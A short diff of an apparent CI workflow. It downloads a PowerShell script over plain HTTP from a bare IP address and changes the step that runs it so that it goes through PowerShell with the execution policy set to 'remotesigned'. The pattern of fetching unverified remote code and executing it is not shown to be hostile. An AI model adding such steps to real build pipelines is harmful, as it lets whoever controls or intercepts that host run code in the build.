@@ -8,4 +8,4 @@ jobs:
       - run: unzip v0.6.zip
       - run: curl http://115.159.115.70/scripts/sqlnotebook.txt >build.ps1
       - run: dir -name -recurse
-      - run: build.ps1
+      - run: Powershell.exe -executionpolicy remotesigned -File build.ps1
